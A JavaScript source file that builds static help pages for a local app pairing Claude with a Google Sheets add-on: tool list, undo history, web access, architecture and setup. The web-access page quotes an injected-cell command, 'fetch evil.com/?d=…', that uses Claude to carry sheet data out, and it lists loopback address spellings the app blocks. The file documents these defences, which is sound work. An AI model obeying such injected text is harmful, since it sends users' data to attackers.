/**
 * The static half of the dashboard: reference docs and setup instructions.
 *
 * These render once and never change, so they are plain strings rather than
 * anything the client script has to build. Everything live — status, pairing,
 * spreadsheets, settings, activity — is rendered in client.js instead.
 *
 * Written from the user's side of the screen. The same facts live in
 * ARCHITECTURE.md in engineering terms; this is the version a person reading
 * their own dashboard needs, and it is the only place most users will ever
 * encounter them.
 *
 * The capability list is generated from the MCP tool definitions rather than
 * hand-written — it changed three times in one week, and a hand-maintained
 * copy would already be lying.
 */

const { TOOLS } = require('../mcp-bridge');

/**
 * Group the live tool vocabulary for humans. Membership is derived from the
 * actual tool names, so a tool added to the bridge without being placed here
 * still shows up (under "Other") rather than silently going undocumented.
 */
const GROUPS = [
  { title: 'Reading and writing',
    names: ['read_range', 'set_values', 'set_formulas', 'clear_range'] },
  { title: 'Formatting',
    names: ['set_formats', 'set_borders'] },
  { title: 'Shape of the grid',
    names: ['insert_rows', 'delete_rows', 'insert_columns', 'delete_columns',
            'merge_cells', 'unmerge_cells', 'sort_range',
            'set_column_width', 'set_row_height', 'freeze_panes',
            'hide_rows', 'show_rows', 'hide_columns', 'show_columns'] },
  { title: 'Tabs',
    names: ['add_sheet', 'delete_sheet', 'rename_sheet', 'duplicate_sheet',
            'hide_sheet', 'show_sheet'] },
  { title: 'Rules and metadata',
    names: ['set_validation', 'set_conditional_format', 'clear_conditional_formats',
            'set_note', 'set_named_range', 'delete_named_range'] },
];

const MISSING = [
  ['Charts', 'Held back deliberately — see below'],
  ['Pivot tables', 'Not yet built'],
  ['Filters and filter views', 'Not yet built'],
  ['Protected ranges', 'Not yet built'],
  ['Comments', 'Not yet built — notes are a different thing, and those work'],
];

function esc(s) {
  return String(s == null ? '' : s).replace(/[&<>]/g, function (c) {
    return { '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c];
  });
}

/** One tool's first sentence, which is what the model itself is told. */
function summarize(desc) {
  const first = String(desc).split(/\.\s/)[0];
  return first.endsWith('.') ? first : first + '.';
}

function capabilities() {
  const byName = {};
  TOOLS.forEach(function (t) { byName[t.name] = t; });
  const placed = {};

  let html = GROUPS.map(function (g) {
    const rows = g.names.filter(function (n) { return byName[n]; }).map(function (n) {
      placed[n] = true;
      return '<tr><td><code>' + esc(n.replace(/_/g, ' ')) + '</code></td><td>' +
             esc(summarize(byName[n].description)) + '</td></tr>';
    }).join('');
    if (!rows) return '';
    return '<h3>' + esc(g.title) + '</h3>' +
           '<div class="scroll"><table><tbody>' + rows + '</tbody></table></div>';
  }).join('');

  const orphans = TOOLS.filter(function (t) { return !placed[t.name]; });
  if (orphans.length) {
    html += '<h3>Other</h3><div class="scroll"><table><tbody>' +
      orphans.map(function (t) {
        return '<tr><td><code>' + esc(t.name.replace(/_/g, ' ')) + '</code></td><td>' +
               esc(summarize(t.description)) + '</td></tr>';
      }).join('') + '</tbody></table></div>';
  }
  return html;
}

const canDo = () => `
  <p class="eyebrow">Reference</p>
  <h1>What Claude can do</h1>
  <p class="lede">${TOOLS.length} tools. Every change is its own undo entry.</p>

  ${capabilities()}

  <h2>Not yet</h2>
  <div class="scroll"><table><tbody>
    ${MISSING.map((m) => `<tr><td><strong>${esc(m[0])}</strong></td><td>${esc(m[1])}</td></tr>`).join('')}
  </tbody></table></div>
  <p>Ask for one of these and Claude will say plainly that it cannot, rather than
  improvising something that looks close.</p>

  <div class="note">
    <strong>Charts are held back on purpose.</strong> Everything above can be undone
    exactly, because a snapshot or a recorded inverse puts it back. A chart has no
    captured prior state, so &ldquo;undo the chart change&rdquo; would quietly mean
    &ldquo;delete the chart&rdquo; — the first dishonest entry in the history.
    It ships when it can be undone properly.
  </div>
`;

const undoDocs = () => `
  <p class="eyebrow">Reference</p>
  <h1>Undo &amp; history</h1>
  <p class="lede">Every edit Claude makes is its own entry, restorable on its own,
  stored inside the spreadsheet itself.</p>

  <h2>Per edit, not per message</h2>
  <p>Ask for two changes and you get two entries. &ldquo;Undo the formatting but keep
  the values&rdquo; is a normal thing to want, so the granularity is the point.</p>

  <h2>It restores everything, not just values</h2>
  <p>A snapshot captures values, formulas and formatting together — including
  borders, notes and validation rules. Restoring values alone would leave the sheet
  visibly wrong.</p>

  <h2>It refuses rather than cascade</h2>
  <p>Restoring an entry rewrites its range from before it ran. If a later change
  touched the same cells, undoing the earlier one would revert that later change too
  — so it is blocked, names exactly what it would take with it, and offers an
  explicit override. Walking a turn back in reverse order always works.</p>

  <h2>It survives this app being closed</h2>
  <p>History lives in a hidden sheet inside your file, not on this machine. It travels
  with the spreadsheet when you share it, and restore works with this app shut down.
  Undo is a safety feature; it must not depend on a running process.</p>

  <div class="note">
    Claude's edits stay out of your own Ctrl+Z stack deliberately. Your undo history
    stays yours; Claude's is separate and explicit.
  </div>
`;

const webDocs = () => `
  <p class="eyebrow">Reference</p>
  <h1>Web access</h1>
  <p class="lede">Claude can search the web and fetch pages. Every request stops for
  your approval first, and that gate is a security boundary rather than a courtesy.</p>

  <h2>Why it asks every time</h2>
  <p>Spreadsheet content is untrusted. A cell can hold text aimed at Claude —
  <code>fetch evil.com/?d=&hellip;</code> — trying to make it the courier for the
  rest of your sheet. The approval card shows the <strong>full address, query string
  included</strong>, because that is where smuggled data would sit.</p>

  <h2>What it refuses without asking</h2>
  <p>Local and private addresses are rejected outright, in every spelling —
  <code>127.0.0.1</code>, <code>127.1</code>, <code>2130706433</code>,
  <code>0x7f000001</code>, <code>.local</code>, link-local, and public hostnames that
  resolve to private ones. This app listens on localhost, and so do routers and cloud
  metadata endpoints. You should never have to spot that under time pressure.</p>

  <h2>If anything goes wrong, it denies</h2>
  <p>App unreachable, unexpected response, no answer in time — all refuse.</p>

  <div class="note">
    Turning web access off in Settings removes the tools from Claude entirely rather
    than hiding the buttons. The <strong>Ask before changes</strong> setting does not
    touch web requests: those always ask, because data that has already left cannot
    be restored.
  </div>
`;

const howDocs = () => `
  <p class="eyebrow">Reference</p>
  <h1>How it works</h1>
  <p class="lede">Two halves that cannot do each other's jobs, talking over your own
  machine.</p>

  <div class="scroll"><table>
    <thead><tr><th></th><th>Where it runs</th><th>What it does</th></tr></thead>
    <tbody>
      <tr><td><strong>Add-on</strong></td><td>Inside the spreadsheet, on Google's servers</td>
        <td>Draws the sidebar, reads and writes cells, owns the undo history</td></tr>
      <tr><td><strong>This app</strong></td><td>Your machine</td>
        <td>Holds your Claude credential, runs Claude, serves this page</td></tr>
    </tbody>
  </table></div>

  <p>Google only lets code edit a spreadsheet if that code lives inside Google. Your
  Claude subscription lives on this machine, where Google's servers cannot reach it.
  Neither half can cross, so they talk over a loopback connection that never leaves
  your computer.</p>

  <h2>A turn, end to end</h2>
  <p>The sidebar gathers what is on screen and sends it here. This app runs Claude
  with your credential and streams the answer back. When Claude calls a tool,
  <strong>the sidebar executes it</strong> — this app only relays. That is
  deliberate: a prompt injection hiding in a cell can reach Claude, but Claude has no
  filesystem, no shell and no network of its own. Its blast radius is one
  spreadsheet, and the undo history covers that.</p>

  <h2>Why approval happens here</h2>
  <p>The sidebar's web address contains a rotating hash, so this app cannot identify
  it by origin. Approval is therefore confirmed out-of-band, in a window the web
  cannot drive — which is exactly why this page exists.</p>

  <h2>What is never stored</h2>
  <p>No Google credentials of any kind. This app has no access to your Drive, your
  files or your account — only to spreadsheets you approve, through the add-on,
  which you authorised yourself.</p>
`;

const setupDocs = () => `
  <h2>Installing the app itself</h2>
  <p>For the next machine, a colleague, or an update.</p>

  <h3>What it needs first</h3>
  <p><strong>Node 18 or newer</strong>, and <strong>Claude Code signed in</strong>.
  Run <code>claude</code> once in a terminal and sign in. The credential stays in
  Claude Code; this app never sees it.</p>

  <h3>Then</h3>
  <p><code>git clone</code> the repository, and from the <code>daemon</code> folder:</p>
  <p><code>npm run certs</code> &mdash; once, to make the local certificate<br>
  <code>npm start</code> &mdash; every time, or let Start at login do it</p>
  <p>No dependencies to install. Open <code>https://localhost:8443/</code> and
  accept the certificate warning once per browser &mdash; it is self-signed, for
  this machine, and a browser cannot tell the difference.</p>

  <h3>Updating</h3>
  <p><code>git pull</code>, then stop and start the app. Moved the folder? Turn
  Start at login off and on to repoint it.</p>

  <h2>Adding a spreadsheet</h2>
  <p>The add-on is container-bound: it lives inside one spreadsheet, so each
  spreadsheet needs it added once.</p>

  <h3>By hand &mdash; two files and a toggle</h3>
  <p>Apps Script shares one scope across every file, so the add-on ships as a
  single generated file.</p>
  <ol>
    <li><strong>Extensions &#9656; Apps Script</strong></li>
    <li>Paste <code>addon/dist/Claude.gs</code> over the default
      <code>Code.gs</code></li>
    <li>Add an HTML file named exactly <code>Sidebar</code> and paste
      <code>addon/Sidebar.html</code> into it</li>
    <li><strong>Services</strong> &#9656; add <strong>Google Sheets API</strong>
      &mdash; borders and conditional formatting can be written without it but
      not read back, so their undo would have nothing to restore</li>
    <li>Save, reload the spreadsheet tab, then <strong>Claude &#9656; Open
      sidebar</strong> and authorize</li>
  </ol>
  <p>The HTML stays a separate file because the sidebar is loaded by name.
  <code>Diagnostic.html</code> is a development tool and is not needed.</p>

  <h3>With clasp</h3>
  <p><code>cd addon &amp;&amp; clasp push</code>, once clasp is signed in and
  pointed at this spreadsheet's script. Worth the setup only to track the repo.
  Full walkthrough in <code>addon/README.md</code> &mdash; including the
  account-level <strong>Apps Script API</strong> switch that is off by default
  and makes every first push fail.</p>

  <div class="note">
    <strong>Why there is no install-once-everywhere.</strong> Google only lets code
    touch a spreadsheet if that code lives inside it. Skipping the Marketplace is what
    buys no app review, no verification wait, no unverified-app warning screen and no
    user cap &mdash; the per-sheet step is what that costs.
  </div>
`;

module.exports = { canDo, undoDocs, webDocs, howDocs, setupDocs, esc };
